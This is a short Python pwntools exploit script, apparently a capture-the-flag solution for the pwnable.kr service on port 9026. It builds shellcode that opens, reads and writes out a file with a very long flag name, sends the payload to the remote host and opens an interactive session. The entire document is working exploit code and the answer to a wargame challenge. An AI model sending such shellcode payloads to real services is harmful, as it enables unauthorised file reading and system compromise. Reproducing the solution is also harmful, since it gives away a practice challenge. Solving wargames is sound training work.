from pwn import *
context(os="linux", arch="amd64")

context.log_level = "debug"

io = remote("pwnable.kr", 9026)
flag_name = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

base_addr = 0x41414000
shell_code = shellcraft.open(flag_name)
# shell_code += shellcraft.read('rax', base_addr+0x400, 0x100)
# shell_code += shellcraft.write(0, base_addr+0x400, 0x100)
shell_code += "lea rbx, [rsp-0x200]; push rbx"
shell_code += shellcraft.read('rax', 'rbx', 0x100)
# shell_code += "lea rbx, [rsp-0x200]"
shell_code += "pop rbx"
shell_code += shellcraft.write(0, 'rbx', 0x100)

payload = asm(shell_code)

io.send(payload)

io.interactive()